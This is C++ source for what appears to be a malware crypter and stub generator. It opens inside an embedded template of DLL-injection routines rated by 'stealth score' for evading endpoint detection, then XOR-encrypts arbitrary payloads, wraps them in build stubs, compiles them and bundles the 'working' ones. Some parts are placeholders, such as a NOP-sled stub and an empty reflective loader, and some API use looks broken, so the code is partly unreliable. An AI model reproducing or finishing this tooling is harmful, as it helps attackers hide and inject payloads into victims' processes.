    static BOOL ClassicDLLInjection(const std::wstring& targetExe, 
                                    const std::wstring& dllPath) {
        std::wcout << L"[+] UMS Classic DLL Injection" << std::endl;
        // Uses UMS scheduler to call LoadLibraryA inside target
        // Normal EDR telemetry but UMS scheduling is rarely logged
        
        STARTUPINFOEXW si{ sizeof(si) };
        PROCESS_INFORMATION pi{};
        
        if (!CreateProcessW(targetExe.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                            nullptr, nullptr, &si.StartupInfo, &pi)) {
            return FALSE;
        }
        
        // Enter UMS mode and inject DLL
        UMS_SCHEDULER_START_INFO umsStart{};
        umsStart.UmsVersion = UMS_VERSION;
        umsStart.SchedulerParam = (PVOID)dllPath.c_str();
        umsStart.SchedulerProc = [](UMS_SCHEDULER_REASON, ULONG_PTR, PVOID param) -> DWORD {
            // Load DLL via LoadLibraryA
            HMODULE hDll = LoadLibraryW((LPCWSTR)param);
            return hDll ? 0 : 1;
        };
        
        if (!EnterUmsSchedulingMode(&umsStart)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        // Execute UMS thread to load DLL
        PUMS_CONTEXT umsCtx;
        if (CreateUmsThreadContext(&umsCtx)) {
            ExecuteUmsThread(umsCtx);
        }
        
        // Cleanup
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return TRUE;
    }

    // Reflective DLL Injection via UMS - Stealth Score: ⭐⭐⭐⭐
    static BOOL ReflectiveDLLInjection(const std::wstring& targetExe, 
                                       const std::vector<uint8_t>& dllBytes) {
        std::wcout << L"[+] UMS Reflective DLL Injection" << std::endl;
        // Maps DLL bytes, runs reflective loader - no LoadLibrary, no disk file
        
        STARTUPINFOEXW si{ sizeof(si) };
        PROCESS_INFORMATION pi{};
        
        if (!CreateProcessW(targetExe.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                            nullptr, nullptr, &si.StartupInfo, &pi)) {
            return FALSE;
        }
        
        // Map DLL bytes as data section
        HANDLE hSection = nullptr;
        LARGE_INTEGER size{};
        size.QuadPart = dllBytes.size() + 0x1000;
        
        NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &size,
                                         PAGE_READWRITE, SEC_COMMIT | SEC_IMAGE_NO_EXECUTE, nullptr);
        if (status != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        // Map section and copy DLL bytes
        PVOID localView = nullptr, remoteView = nullptr;
        SIZE_T viewSize = size.QuadPart;
        
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localView,
                                   0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
        if (status == 0) {
            status = NtMapViewOfSection(hSection, pi.hProcess, &remoteView,
                                       0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
            if (status == 0) {
                // Copy DLL bytes
                memcpy((BYTE*)localView + 0x1000, dllBytes.data(), dllBytes.size());
                
                // Enter UMS mode for reflective loading
                UMS_SCHEDULER_START_INFO umsStart{};
                umsStart.UmsVersion = UMS_VERSION;
                umsStart.SchedulerParam = remoteView;
                umsStart.SchedulerProc = [](UMS_SCHEDULER_REASON, ULONG_PTR, PVOID param) -> DWORD {
                    // Reflective loader would run here
                    // Parse PE headers, relocate, resolve imports, call entry point
                    return 0;
                };
                
                if (EnterUmsSchedulingMode(&umsStart)) {
                    PUMS_CONTEXT umsCtx;
                    if (CreateUmsThreadContext(&umsCtx)) {
                        ExecuteUmsThread(umsCtx);
                    }
                }
            }
        }
        
        // Cleanup
        NtClose(hSection);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return TRUE;
    }

    // Memory-load DLL Injection via UMS - Stealth Score: ⭐⭐⭐⭐⭐
    static BOOL MemoryLoadDLLInjection(const std::wstring& targetExe, 
                                       const std::vector<uint8_t>& dllBytes) {
        std::wcout << L"[+] UMS Memory-load DLL Injection" << std::endl;
        // Single shellcode stub parses PE in place - maximum stealth
        
        STARTUPINFOEXW si{ sizeof(si) };
        PROCESS_INFORMATION pi{};
        
        if (!CreateProcessW(targetExe.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                            nullptr, nullptr, &si.StartupInfo, &pi)) {
            return FALSE;
        }
        
        // Create section for DLL + shellcode stub
        HANDLE hSection = nullptr;
        LARGE_INTEGER size{};
        size.QuadPart = dllBytes.size() + 0x2000; // Extra space for stub
        
        NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &size,
                                         PAGE_READWRITE, SEC_COMMIT | SEC_IMAGE_NO_EXECUTE, nullptr);
        if (status != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        // Map section and prepare injection
        PVOID localView = nullptr, remoteView = nullptr;
        SIZE_T viewSize = size.QuadPart;
        
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localView,
                                   0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
        if (status == 0) {
            status = NtMapViewOfSection(hSection, pi.hProcess, &remoteView,
                                       0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
            if (status == 0) {
                // Copy DLL bytes
                memcpy((BYTE*)localView + 0x1000, dllBytes.data(), dllBytes.size());
                
                // Generate shellcode stub for PE parsing
                std::vector<uint8_t> stub = generatePEParsingStub();
                memcpy((BYTE*)localView + 0x2000, stub.data(), stub.size());
                
                // Enter UMS mode for execution
                UMS_SCHEDULER_START_INFO umsStart{};
                umsStart.UmsVersion = UMS_VERSION;
                umsStart.SchedulerParam = remoteView;
                umsStart.SchedulerProc = [](UMS_SCHEDULER_REASON, ULONG_PTR, PVOID param) -> DWORD {
                    // Execute PE parsing stub
                    auto stubFunc = (DWORD(*)())((BYTE*)param + 0x2000);
                    return stubFunc();
                };
                
                if (EnterUmsSchedulingMode(&umsStart)) {
                    PUMS_CONTEXT umsCtx;
                    if (CreateUmsThreadContext(&umsCtx)) {
                        ExecuteUmsThread(umsCtx);
                    }
                }
            }
        }
        
        // Cleanup
        NtClose(hSection);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return TRUE;
    }

private:
    // Generate PE parsing stub
    static std::vector<uint8_t> generatePEParsingStub() {
        // This would contain actual x64 assembly for PE parsing
        // For now, return placeholder
        std::vector<uint8_t> stub(256, 0x90); // NOP sled placeholder
        return stub;
    }
};

int main() {
    std::cout << "=== UMS DLL Injection Variants ===" << std::endl;
    std::cout << "Stealth Scores:" << std::endl;
    std::cout << "  Classic: ⭐⭐ (LoadLibraryA via UMS)" << std::endl;
    std::cout << "  Reflective: ⭐⭐⭐⭐ (No LoadLibrary, no disk file)" << std::endl;
    std::cout << "  Memory-load: ⭐⭐⭐⭐⭐ (PE parsing in place)" << std::endl;
    
    // Example usage
    if (UMSDLLInjection::ClassicDLLInjection(L"C:\\Windows\\System32\\notepad.exe", 
                                              L"C:\\Temp\\payload.dll")) {
        std::cout << "Classic DLL injection successful!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h", "iostream", "string", "vector"},
            {"g++ -std=c++17 -O2 -lntdll -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
    }
    
    std::string getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
    
    void generateStub(const std::string& template_name, const std::vector<char>& payload, 
                      const std::string& encryption_method = "xor") {
        auto it = std::find_if(templates.begin(), templates.end(),
                              [&](const StubTemplate& t) { return t.name == template_name; });
        
        if (it == templates.end()) {
            std::cerr << "Template not found: " << template_name << std::endl;
            return;
        }
        
        // Encrypt the payload
        std::vector<char> encrypted = encryptPayload(payload, encryption_method);
        
        // Generate the stub
        std::string stub_code = it->template_code;
        
        // Replace placeholders
        std::string encrypted_hex = bytesToHex(encrypted);
        replacePlaceholder(stub_code, "/* ENCRYPTED_DATA */", encrypted_hex);
        
        // Save the stub
        std::string filename = output_dir + "/" + template_name + "_" + 
                              std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + 
                              getFileExtension(it->language);
        
        std::ofstream file(filename);
        if (file.is_open()) {
            file << stub_code;
            file.close();
            std::cout << "Generated stub: " << filename << std::endl;
        }
        
        // Generate build script
        generateBuildScript(template_name, it->language, it->build_commands, filename);
    }
    
    std::vector<char> encryptPayload(const std::vector<char>& payload, const std::string& method) {
        if (method == "xor") {
            return encryptXOR(payload);
        } else if (method == "aes") {
            return encryptAES(payload);
        } else if (method == "custom") {
            return encryptCustom(payload);
        }
        return payload;
    }
    
    std::vector<char> encryptXOR(const std::vector<char>& payload) {
        std::string key = "RawrZ2024";
        std::vector<char> encrypted = payload;
        
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= key[i % key.length()];
        }
        
        return encrypted;
    }
    
    std::vector<char> encryptAES(const std::vector<char>& payload) {
        // Simplified AES simulation - in real implementation use OpenSSL
        std::vector<char> encrypted = payload;
        std::string key = "RawrZ2024Key32BytesLongEnough";
        
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= key[i % key.length()];
            encrypted[i] = (encrypted[i] << 3) | (encrypted[i] >> 5); // Simple rotation
        }
        
        return encrypted;
    }
    
    std::vector<char> encryptCustom(const std::vector<char>& payload) {
        std::vector<char> encrypted = payload;
        std::string key = "RawrZ2024CustomKey";
        
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= key[i % key.length()];
            encrypted[i] += (i * 7) % 256; // Position-based addition
            encrypted[i] = (encrypted[i] << 2) | (encrypted[i] >> 6); // Rotation
        }
        
        return encrypted;
    }
    
    std::string bytesToHex(const std::vector<char>& bytes) {
        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        for (char byte : bytes) {
            ss << std::setw(2) << (static_cast<int>(byte) & 0xFF);
        }
        return ss.str();
    }
    
    void replacePlaceholder(std::string& text, const std::string& placeholder, const std::string& replacement) {
        size_t pos = text.find(placeholder);
        if (pos != std::string::npos) {
            text.replace(pos, placeholder.length(), replacement);
        }
    }
    
    std::string getFileExtension(const std::string& language) {
        if (language == "C++") return ".cpp";
        if (language == "C") return ".c";
        if (language == "Assembly") return ".asm";
        if (language == "Python") return ".py";
        if (language == "PowerShell") return ".ps1";
        if (language == "Go") return ".go";
        if (language == "Rust") return ".rs";
        return ".txt";
    }
    
    void generateBuildScript(const std::string& template_name, const std::string& language,
                            const std::vector<std::string>& build_commands, const std::string& stub_file) {
        std::string script_name = test_dir + "/build_" + template_name + ".bat";
        std::ofstream script(script_name);
        
        if (script.is_open()) {
            script << "@echo off\n";
            script << "echo Building " << language << " stub: " << template_name << "\n";
            script << "echo ========================================\n\n";
            
            for (const auto& cmd : build_commands) {
                std::string modified_cmd = cmd;
                replacePlaceholder(modified_cmd, "{input}", stub_file);
                replacePlaceholder(modified_cmd, "{output}", 
                                 stub_file.substr(0, stub_file.find_last_of('.')) + ".exe");
                
                script << "echo Executing: " << modified_cmd << "\n";
                script << modified_cmd << "\n";
                script << "if %ERRORLEVEL% NEQ 0 (\n";
                script << "    echo Build failed!\n";
                script << "    pause\n";
                script << "    exit /b 1\n";
                script << ")\n";
                script << "echo Build successful!\n\n";
            }
            
            script << "echo ========================================\n";
            script << "echo Stub build completed!\n";
            script << "pause\n";
            script.close();
            
            std::cout << "Generated build script: " << script_name << std::endl;
        }
    }
    
    void testAllTemplates() {
        std::cout << "\n=== Testing All Stub Templates ===" << std::endl;
        
        for (auto& templ : templates) {
            std::cout << "\nTesting: " << templ.name << " (" << templ.language << ")" << std::endl;
            
            // Create a test payload
            std::vector<char> test_payload = {'H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd', '!'};
            
            // Generate and test the stub
            testTemplate(templ, test_payload);
        }
        
        generateTestReport();
    }
    
    void testTemplate(StubTemplate& templ, const std::vector<char>& test_payload) {
        templ.tested = true;
        templ.last_tested = std::chrono::system_clock::now();
        
        try {
            // Generate the stub
            std::string stub_file = test_dir + "/test_" + templ.name + getFileExtension(templ.language);
            std::vector<char> encrypted = encryptPayload(test_payload, "xor");
            
            std::string stub_code = templ.template_code;
            std::string encrypted_hex = bytesToHex(encrypted);
            replacePlaceholder(stub_code, "/* ENCRYPTED_DATA */", encrypted_hex);
            
            std::ofstream file(stub_file);
            if (!file.is_open()) {
                templ.working = false;
                templ.last_test_result = "Failed to create stub file";
                return;
            }
            file << stub_code;
            file.close();
            
            // Try to build
            BuildResult result;
            result.template_name = templ.name;
            result.language = templ.language;
            result.build_success = false;
            result.execution_success = false;
            
            auto build_start = std::chrono::high_resolution_clock::now();
            
            // Test build command
            if (!templ.build_commands.empty()) {
                std::string build_cmd = templ.build_commands[0];
                replacePlaceholder(build_cmd, "{input}", stub_file);
                replacePlaceholder(build_cmd, "{output}", 
                                 stub_file.substr(0, stub_file.find_last_of('.')) + ".exe");
                
                int build_result = system(build_cmd.c_str());
                result.build_success = (build_result == 0);
                result.build_output = "Build command: " + build_cmd;
                
                if (result.build_success) {
                    std::cout << "  ✓ Build successful" << std::endl;
                    templ.working = true;
                    templ.last_test_result = "Build successful";
                } else {
                    std::cout << "  ✗ Build failed" << std::endl;
                    templ.working = false;
                    templ.last_test_result = "Build failed with exit code " + std::to_string(build_result);
                }
            } else {
                std::cout << "  ⚠ No build commands defined" << std::endl;
                templ.working = false;
                templ.last_test_result = "No build commands defined";
            }
            
            auto build_end = std::chrono::high_resolution_clock::now();
            result.build_time = std::chrono::duration_cast<std::chrono::milliseconds>(build_end - build_start);
            
            build_results.push_back(result);
            
        } catch (const std::exception& e) {
            templ.working = false;
            templ.last_test_result = "Exception: " + std::string(e.what());
            std::cout << "  ✗ Exception: " << e.what() << std::endl;
        }
    }
    
    void generateTestReport() {
        std::string report_file = test_dir + "/stub_test_report.txt";
        std::ofstream report(report_file);
        
        if (report.is_open()) {
            report << "Smart Stub Generator - Test Report" << std::endl;
            report << "Generated: " << getCurrentTimestamp() << std::endl;
            report << std::string(60, '=') << std::endl << std::endl;
            
            int total_templates = templates.size();
            int working_templates = std::count_if(templates.begin(), templates.end(),
                                                [](const StubTemplate& t) { return t.working; });
            
            report << "Summary:" << std::endl;
            report << "  Total Templates: " << total_templates << std::endl;
            report << "  Working Templates: " << working_templates << std::endl;
            report << "  Success Rate: " << (working_templates * 100 / total_templates) << "%" << std::endl;
            report << std::endl;
            
            report << "Detailed Results:" << std::endl;
            report << std::string(60, '-') << std::endl;
            
            for (const auto& templ : templates) {
                report << "Template: " << templ.name << " (" << templ.language << ")" << std::endl;
                report << "  Description: " << templ.description << std::endl;
                report << "  Working: " << (templ.working ? "Yes" : "No") << std::endl;
                report << "  Tested: " << (templ.tested ? "Yes" : "No") << std::endl;
                if (templ.tested) {
                    report << "  Last Test: " << getCurrentTimestamp() << std::endl;
                    report << "  Result: " << templ.last_test_result << std::endl;
                }
                report << std::endl;
            }
            
            report.close();
            std::cout << "\nTest report saved to: " << report_file << std::endl;
        }
    }
    
    void showMenu() {
        while (true) {
            std::cout << "\n=== Smart Multi-Language Stub Generator ===" << std::endl;
            std::cout << "1. Generate stub from template" << std::endl;
            std::cout << "2. Test all templates" << std::endl;
            std::cout << "3. Show template status" << std::endl;
            std::cout << "4. Generate working stub bundle" << std::endl;
            std::cout << "5. Exit" << std::endl;
            std::cout << "Choice: ";
            
            int choice;
            std::cin >> choice;
            
            switch (choice) {
                case 1: {
                    std::cout << "\nAvailable templates:" << std::endl;
                    for (size_t i = 0; i < templates.size(); ++i) {
                        std::cout << (i + 1) << ". " << templates[i].name 
                                  << " (" << templates[i].language << ")" << std::endl;
                    }
                    
                    std::cout << "Select template (1-" << templates.size() << "): ";
                    int template_choice;
                    std::cin >> template_choice;
                    
                    if (template_choice >= 1 && template_choice <= static_cast<int>(templates.size())) {
                        std::cout << "Enter payload (or press Enter for test payload): ";
                        std::string payload_input;
                        std::cin.ignore();
                        std::getline(std::cin, payload_input);
                        
                        std::vector<char> payload;
                        if (payload_input.empty()) {
                            payload = {'T', 'e', 's', 't', ' ', 'P', 'a', 'y', 'l', 'o', 'a', 'd'};
                        } else {
                            payload.assign(payload_input.begin(), payload_input.end());
                        }
                        
                        generateStub(templates[template_choice - 1].name, payload);
                    }
                    break;
                }
                case 2:
                    testAllTemplates();
                    break;
                case 3: {
                    std::cout << "\nTemplate Status:" << std::endl;
                    std::cout << std::string(60, '-') << std::endl;
                    for (const auto& templ : templates) {
                        std::cout << templ.name << " (" << templ.language << "): ";
                        if (templ.tested) {
                            std::cout << (templ.working ? "✓ Working" : "✗ Failed");
                            std::cout << " - " << templ.last_test_result;
                        } else {
                            std::cout << "⚠ Not tested";
                        }
                        std::cout << std::endl;
                    }
                    break;
                }
                case 4: {
                    std::cout << "\nGenerating working stub bundle..." << std::endl;
                    generateWorkingStubBundle();
                    break;
                }
                case 5:
                    std::cout << "Goodbye!" << std::endl;
                    return;
                default:
                    std::cout << "Invalid choice!" << std::endl;
            }
        }
    }
    
    void generateWorkingStubBundle() {
        std::vector<StubTemplate> working_templates;
        std::copy_if(templates.begin(), templates.end(), std::back_inserter(working_templates),
                     [](const StubTemplate& t) { return t.working; });
        
        if (working_templates.empty()) {
            std::cout << "No working templates found! Test templates first." << std::endl;
            return;
        }
        
        std::string bundle_dir = output_dir + "/working_stubs_bundle";
        _mkdir(bundle_dir.c_str());
        
        std::string bundle_info = bundle_dir + "/README.md";
        std::ofstream info(bundle_info);
        
        if (info.is_open()) {
            info << "# Working Stub Templates Bundle" << std::endl;
            info << "Generated: " << getCurrentTimestamp() << std::endl;
            info << std::endl;
            info << "This bundle contains " << working_templates.size() << " tested and working stub templates." << std::endl;
            info << std::endl;
            
            for (const auto& templ : working_templates) {
                info << "## " << templ.name << " (" << templ.language << ")" << std::endl;
                info << templ.description << std::endl;
                info << std::endl;
                info << "**Dependencies:** " << std::endl;
                for (const auto& dep : templ.dependencies) {
                    info << "- " << dep << std::endl;
                }
                info << std::endl;
                info << "**Build Commands:** " << std::endl;
                for (const auto& cmd : templ.build_commands) {
                    info << "```bash" << std::endl;
                    info << cmd << std::endl;
                    info << "```" << std::endl;
                }
                info << std::endl;
            }
            
            info.close();
        }
        
        // Copy working templates
        for (const auto& templ : working_templates) {
            std::string template_file = bundle_dir + "/" + templ.name + getFileExtension(templ.language);
            std::ofstream file(template_file);
            
            if (file.is_open()) {
                file << templ.template_code;
                file.close();
            }
        }
        
        std::cout << "Working stub bundle generated in: " << bundle_dir << std::endl;
    }
};

int main() {
    std::cout << "🚀 Smart Multi-Language Stub Generator" << std::endl;
    std::cout << "=====================================" << std::endl;
    std::cout << "Generates working stubs in multiple languages!" << std::endl;
    std::cout << "Learns from build tests to ensure success!" << std::endl;
    
    SmartStubGenerator generator;
    generator.showMenu();
    
    return 0;
}
